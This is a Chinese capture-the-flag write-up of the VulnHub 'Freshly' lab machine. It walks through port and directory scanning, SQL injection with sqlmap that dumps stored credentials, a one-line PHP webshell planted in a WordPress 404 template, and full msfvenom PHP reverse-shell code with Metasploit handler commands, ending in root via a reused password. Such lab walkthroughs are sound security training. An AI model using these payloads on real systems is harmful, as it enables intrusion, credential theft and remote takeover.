\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/4wn\_mSG0hNgEumRQZbLW3w)

靶机下载链接 ：

https://download.vulnhub.com/tophatsec/Freshly.ova

测试环境：

靶机：Freshly      

网络连接方式：桥接模式           

运行软件：Virtualbox

攻击机：kali，win10

网络连接方式：桥接模式

  

  

  

  

  

  

  

信息收集

**1.1、确认 IP**  

nmap 扫描确认主机存活，确认靶机 IP：192.168.50.78

nmap -sn 192.168.50.1/24

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yetvNIs7q9MV4YzjAUX7eJs4ZWnkQxk0icEdNtibHLOj6LNuRvtWibW2hjQ/640?wx_fmt=png)

**1.2、扫描端口和服务**

nmap 扫描端口和服务，将结果报错到 freshly.txt 文件中

nmap -p- -A 192.168.50.78 -oN freshly.txt

收集的信息：

80         http

443       https

8080     http

linux3.2-4.9     ubuntu  apache2.4.7

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeNeXjfIdE7vYWBk55yQYP3QLlNkFwpRpA4JbpOpZIMXy0APkibRAFtug/640?wx_fmt=png)

**1.3、访问 http 服务**

访问 80 端口，http://192.168.50.78/， 一张图片，没有发现什么有用的信息

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeicQQXhKhhv98OeL5d8YSx0ULD5d2fFZbD3sgQOhSlsjIpgYXpiaqk7cg/640?wx_fmt=png)

访问 443 端口，https://192.168.50.78/ ，找到一个 wordpress 站点

https://192.168.50.78/wordpress/

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yet53lSMcukB5ZmNVZuWhiaDNrLoaDJKHX53AZdX7EoWd3EwZswWwaZVw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeibaL6g0KO7SNvnI8eKZXmvmjjLoT0b2ls8fD9OeDUpmBWMyFsQMibI0A/640?wx_fmt=png)

访问 8080，http://192.168.50.78:8080/ ，还是得到这个页面

https://192.168.50.78/wordpress/

**1.4、扫描目录**

dirb 扫描目录

/img/

/wordpress/

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeQb66CLQia2QNjHmL7yiahrteiauCQeaNiabw1Ue19MLuYx0saXyFCUHcIw/640?wx_fmt=png)

dirbuster 扫描目录

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeicYicLx5PdZ74R3Qg5NIXAPGGwYh4ocRnwjcJaGFSQBfjb6a3Fj305Pg/640?wx_fmt=png)

  

  

  

找 web 漏洞

**2.1、查看 wordpress 页面**

访问了

/store/,/cart/,/checkout/,/express/,/ipn/,/receipt/，这几个目录，没找到什么有用的信息

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeSgleALdtv8OafAZwHCPEgdrzaAxvdmibJBNgiaprsedrNbqmFkg7bciag/640?wx_fmt=png)

访问

http://192.168.50.78:8080/wordpress/atom ，一个邮件订阅页面，没发现有什么用

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yebLb4DSAOyibpRrv2X6FtyuianxgBibBR5o10TcwFibcm31OVicbgPkSDygg/640?wx_fmt=png)

在搜索处尝试 SQL 注入，没有成功，用 sqlmap 也没结果

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yezLxMWJ0hZqJ5piaugqaibeEBcBhyrZbJ0yyVGticcFicJzJDibeC7IqeWOQ/640?wx_fmt=png)

访问

http://192.168.50.78:8080/wordpress/wp-admin/ ，是一个更新数据库的页面

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeKD3mSzH2AZicNEKQ4dxAKEFt924Lia7s2goPIHvia9IdshpWwY8UdY4dw/640?wx_fmt=png)

更新了下，没发现页面有什么变化

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeRqmOoEdC9T8v8NOoaLVjawa4tqS3icAXKibPicpVtE5PwSnPAOvQbiaelA/640?wx_fmt=png)

页面跳转至

http://192.168.50.78:8080/wordpress/login ，wordpress 后台的登陆页

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeYeiaAKvnYIZeHibtLXaTeDenPIiaNAP7kd77J1Mt2CViawgibR2SegBFY7w/640?wx_fmt=png)

提示密码错误，说明 admin 用户存在，尝试弱口令爆破，没有成功

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeLWpP5GKH5RcgsicvzzxukFfYPnTYichn4BibHTT5GWH2qfrGXibibegQyJQ/640?wx_fmt=png)

在主页下方的留言板留言试试

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeia5zkib01TcH81yUqn3re4dSXYfm87qvcNGchdkibBYJcXqEic5iatialUVg/640?wx_fmt=png)

页面跳转至

https://192.168.50.78/wordpress/wp-comments-post.php ，并提示错误，没测出来漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeHMFyu4edjyZh1qdkjJsN2CFIc4QbjWQZj39A4XKib8aqqVHc5rDUwjQ/640?wx_fmt=png)

**2.2、wpscan 扫描**

用 wpscan 扫描下，没发现什么有用的信息

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2ye2icibS2mA3b4ORjRw0xj3Cphlicib1FxHXKJibzhAMWUgR5CYV9c6ibvGU2g/640?wx_fmt=png)

**2.3、忽略掉的思路和方向**

**扫目录加上端口**

扫描目录时，忘了加端口，而默认扫描的，不是 80 端口下的内容，导致扫描出来的目录不全

重新扫描，http://192.168.50.78:80/

得到新的方向：

http://192.168.50.78:80/login.php

http://192.168.50.78:80/phpmyadmin/    

http://192.168.50.78:80/javascript/

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yef0wymIQfI7GUUKwZlaXJVibFjomIlXlibXc9R73Scm352SCDmxUX1B5Q/640?wx_fmt=png)

访问

http://192.168.50.78:80/phpmyadmin/ ，尝试爆破，失败

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeyInUYXH7VYb5hVLZVFic4oFXQOfNLS2RRcFrRh1vTibfEL6mY3htkU2Q/640?wx_fmt=png)

**SQL 注入**

访问 http://192.168.50.78:80/login.php ，发现是个登陆页面

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeJUxGV0KWnbPIE2PsTbZE8AicydYgrEcyAoKD9V7ibicAW2aRoQ21a9e7g/640?wx_fmt=png)

尝试万能密码，发现单引号就能绕过

1' or 1=1 #

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2ye6IvbcafCEu5WM3nHsuYa6L3xtsjh7vPSkJBpunL3S3ibSEjw2ibsU9Nw/640?wx_fmt=png)

页面没有跳转，只有 0 和 1 的显示，属于布尔型的注入

**确认数据库名长度**

确认数据库名长度为 5

1' or 1=1 and length(database())=5#  // 回显 1

1' or 1=1 and length(database())>5# // 回显 0

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeLqtJHHibodtFozXy7yG3n5QqtGHibbvrQ8ZsYia8fandyvnOruhm5CXWg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeFUic3jXuonodlB3T2tUevMOWMI6YEcBz6SlWdudzy0FzibJ7zZxMibGhA/640?wx_fmt=png)

**sqlmap**

布尔盲注有些繁琐，还是用 sqlmap 跑下吧

先拿到 POST 请求包，在 user=1 后加个 \* 指定下注入点，将请求包保存到 sqltest.txt 中

```
POST /login.php HTTP/1.1
Host: 192.168.50.78
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.50.78/login.php
Cookie: PHPSESSID=qj4c92fpeec7236d5iio3eceb3; Cart66DBSID=O2RHWHKR2J77SNGIKR89DWXKCOAXPLIL3DQRF2VD
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
user=1\*&password=1&s=Submi
```

使用 sqlmap 进行测试

sqlmap -r sqltest.txt --batch

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeMYiblDsuuoD3aDb6StXa9dLicYZiaosjQxAbbLn2cRZiaFibVxrmtBdiaIpw/640?wx_fmt=png)

结果跑出来的是个时间盲注。。。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yevepkra7fia0icyQua3WQ3C3cLQEDm5arctpkic0rOiaTArwbfgGeH1ExXg/640?wx_fmt=png)

sqlmap -r sqltest.txt --dbs --batch

**跑库名**

```
\[\*\] information\_schema
\[\*\] login
\[\*\] mysql
\[\*\] performance\_schema
\[\*\] phpmyadmin
\[\*\] users
\[\*\] wordpress8080
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeGLcibVjvcax1G5laCWAxysag0FLYPAHLDicotWglWGiaRGVj5n28m492A/640?wx_fmt=png)

sqlmap -r sqltest.txt -D login --tables --batch

**跑表名**

```
+-----------+
| user\_name |
| users     |
+-----------+
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeOl3IrXHibqEVCiaywyWvPnMOXg7M4QKUibKFncYUoexKJcYMmMIoXtR2w/640?wx_fmt=png)

sqlmap -r sqltest.txt -D users --tables --batch

结果，users 下没有表

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2ye3S4EgXwL9wqYQ0bSYrWxXdYvpI2ib4acib6UWbcnIlyevWatvQwxXaFQ/640?wx_fmt=png)

sqlmap -r sqltest.txt -D wordpress8080 --tables --batch

```
+-------+
| users |
+-------+
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yelyBVticykrwYAf0whDJKEUxAddh6dSyXKcO8mFwzmMYzCbZshCpUNYg/640?wx_fmt=png)

sqlmap -r sqltest.txt -D phpmyadmin --tables --batch

```
+---------------------+
| pma\_bookmark        |
| pma\_column\_info     |
| pma\_designer\_coords |
| pma\_history         |
| pma\_pdf\_pages       |
| pma\_recent          |
| pma\_relation        |
| pma\_table\_coords    |
| pma\_table\_info      |
| pma\_table\_uiprefs   |
| pma\_tracking        |
| pma\_userconfig      |
+---------------------+
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeJtAwfvL0kxOBZKUkk7pwMEuRibaaWr6BpgDjicAKpjMpSEURUia9QGjsQ/640?wx_fmt=png)

**跑字段**

查询 login 数据库下 users 表中的字段，password 和 user\_name

sqlmap -r sqltest.txt -D login -T users --columns --batch  

```
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| password  | varchar(20) |
| user\_name | varchar(20) |
+-----------+-------------+
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeibzMolfwXUv7Uc5eoAniaUwibPxhf0yHCzgPBtXjWX0WjM3s1yYnTEbRQ/640?wx_fmt=png)

查询 login 数据库下 user\_name 表中的字段，得到 user\_name 字段

sqlmap -r sqltest.txt -D login -T user\_name --columns --batch

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yez3WSvxVib1ErNu05SMiaRqoO5HIphicF7yaUUUsE8wsRTuMXaVE4FqTRg/640?wx_fmt=png)

查询 wordpress8080 数据库下 users 表中的字段，得到 password 与 username 字段

sqlmap -r sqltest.txt -D wordpress8080 -T users --columns --batch

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yefFibu7MT3lvzaA23ibPIGM3FYZNTjXIchrp9CRxpXOK7tsZMaRh2ZOYg/640?wx_fmt=png)

**跑值**  

查询 login 数据库下 user\_name 表下的 user\_name 字段的值，得到 candyshop

sqlmap -r sqltest.txt -D login -T user\_name -C user\_name --dump --batch

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2ye7BwqDDGMp2wJh5Fa7OTbFuZvoswUBI4g3fPXz5AQu3tMvBPHLf0OVQ/640?wx_fmt=png)

查询 login 数据库下 users 表下的 user\_name 字段的值，得到 candyshop 和 Sir

sqlmap -r sqltest.txt -D login -T users -C user\_name --dump --batch

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeT9xASflaWGgdB0JyuBLwB8km0cxzXYppOGIeWAuBRb1crvGvJIdLfA/640?wx_fmt=png)

查询 login 数据库下 users 表下的 password 字段的值，得到 password 和 PopRocks

sqlmap -r sqltest.txt -D login -T users -C password --dump --batch

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeycs5ibY54ye6wYDIjto6rYgeA4PDJQibu78PI3FRM0WXrCGARp4jblbA/640?wx_fmt=png)

查询 wordpress8080 数据库下 users 表下的 username 字段的值，得到 admin

sqlmap -r sqltest.txt -D wordpress8080 -T users -C username --dump --batch  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeebOEUSUx2S4Q13B49TWkIU6CLWicibWzGq2IB9VPhibvU7PY8TIlrJqSw/640?wx_fmt=png)

查询 wordpress8080 数据库下 users 表下的 password 字段的值，得到 SuperSecretPassword

sqlmap -r sqltest.txt -D wordpress8080 -T users -C password --dump --batch  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yevYlWGpTq4rRkBneCXMMWrXVkzY2xDFaOibEX5ibvyhEPOAK1E2icZzQfg/640?wx_fmt=png)

**2.4、拿 shell**

**C 刀**  

拿到上面三对账号密码尝试登陆 Wordpress，只有 admin 与 SuperSecretPassword 可以登陆

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeUEuAgrMIMfmaMGXxewTSYMvYfu4l37AVpNsiagCxhgBmRCrr5kOaHTQ/640?wx_fmt=png)

既然成功登陆到 Wordpress，这次还是利用 404 页面拿 shell

试着直接往 404 页面末尾加入一句话木马

<?php @assert($\_POST\[x\]); ?>

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yesaxzjxPXQSMo3oO6gwqWibAcicFqChaB4EwTOsFdYw2FLEftC8BsopQw/640?wx_fmt=png)

用蚁剑连接失败，用 C 刀可以连接 404 页面

https://192.168.50.78/wordpress/wp-content/themes/Kratos-2/404.php   密码 x

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2ye90wTu9AbSrwZgicOgzQnWMDVYAKiaUxwKjVV0MicNv7HPqh5kicrZfjxibQ/640?wx_fmt=png)

试着通过 C 刀的模拟终端来提权发现不行，干脆直接重新上传个 webshell 即可，但不知道为啥 C 刀一上传文件软件就崩溃了，算了，换个方式

**msf 反弹 shell**  

通过 msf 生成 php 格式的 webshell，将内容复制刀 404.php 中

msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.50.131 LPORT=9999 -f raw >shell.php

得到 shell.php 的具体内容如下：

```
/\*<?php /\*\*/ error\_reporting(0); $ip = '192.168.50.131';
$port = 9999; 
if (($f = 'stream\_socket\_client') && is\_callable($f)) { $s = $f("tcp://{$ip}:{$port}");
$s\_type = 'stream';
}
if (!$s && ($f = 'fsockopen') && is\_callable($f)) { $s = $f($ip, $port); 
$s\_type = 'stream'; 
} 
if (!$s && ($f = 'socket\_create') && is\_callable($f)) { $s = $f(AF\_INET, SOCK\_STREAM, SOL\_TCP); 
$res = @socket\_connect($s, $ip, $port);
if (!$res) { die(); 
}
$s\_type = 'socket';
}
if (!$s\_type) { die('no socket funcs'); 
}
if (!$s) { die('no socket'); 
}
switch ($s\_type) { case 'stream': $len = fread($s, 4); 
break; 
case 'socket': $len = socket\_read($s, 4); break; 
}
if (!$len) { die();
}
$a = unpack("Nlen", $len); 
$len = $a\['len'\]; $b = ''; 
while (strlen($b) < $len) { switch ($s\_type) { case 'stream': $b .= fread($s, $len-strlen($b)); 
break; case 'socket': $b .= socket\_read($s, $len-strlen($b)); 
break; 
} 
}
$GLOBALS\['msgsock'\] = $s; 
$GLOBALS\['msgsock\_type'\] = $s\_type;
if (extension\_loaded('suhosin') && ini\_get('suhosin.executor.disable\_eval')) { $suhosin\_bypass=create\_function('', $b);
$suhosin\_bypass(); 
}
else { eval($b); 
}
die();
```

将 shell 内容放到 <?php  ?> 标签中，然后复制到 404.php 最下方

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yegccRMPgIc0IqkwkLFUhFt6R67q7rpibjx6NIicMp7CJxrR1e3LqPX6hg/640?wx_fmt=png)

msf 监听 9999 端口

```
use exploit/multi/handler
set payload php/meterpreter/reverse\_tcp
set lhost 192.168.50.131
set lport 9999
exploit
```

访问 https://192.168.50.78/wordpress/wp-content/themes/Kratos-

2/404.php   这个 404 页面

成功反弹 shell，使用 python 反弹终端

python -c 'import 

pty;pty.spawn("/bin/bash")'

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeI8iaBRgq8YoM1y7LqLvSKicLCV6QhabQP2iaZdQrASp7PvN5EaChsg0OA/640?wx_fmt=png)

**2.5、提权**

输入 su

输入密码 SuperSecretPassword

成功提权至 root

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeiabfYMAKXeC6oZEXDIEYL2rAmIfsia0MJSjaI3RnBPNEEJrOiaBLHzglg/640?wx_fmt=png)

本来还查看了 / etc/passwd，发现有用户 candycane，输入密码 password，切换了用户

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2ye7GdPaPvcUiawYc3C9G0rN63g6liaX0qAj4eqw2uGricTKCG0fFkjBTibEw/640?wx_fmt=png)

再从 candycane 提权到 root

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yeiaV77sPibJPicssEQdcVib6GiaiamtvQltNLTInxMe3IF9jaCNdeYBm2Q9qw/640?wx_fmt=png)

没想到直接从 daemon 提权至 root 成功了。。。

  

  

  

总结

**遇到的坑：**

1、扫目录的时候没有加端口，以为不加端口就是默认扫描 80 端口。。没想到默认扫的是 8080 端口，导致一直没找到突破口

2、尝试菜刀拿 shell 时，通过菜刀连接，一上传或下载文件就卡死。。。

3、尝试 msf 反弹 shell 时，发现 shell.php 并无完整的 php 标签 <?php ?>，随意将代码复制到了原 404 代码中的<?php ?> 中，虽然也能成功反弹 shell，但 404.php 页面会打不开

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2yervu6I4OsfEYzIL71EosGGwsJT8l3OGEx63YaMEA10buRyCs9ibBjWwA/640?wx_fmt=png)

**新 get 的思路和方法：**

可以在保证 404 页面正常访问前提下，利用 wordpress 的 404 页面反弹 shell

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeFKBD4IxCbXZ8sQYhY2ye37BRMehWvR8tULkTFjJbwburmPMlhJaFxFh0vPicbxCvH6Krib40SsHQ/640?wx_fmt=png)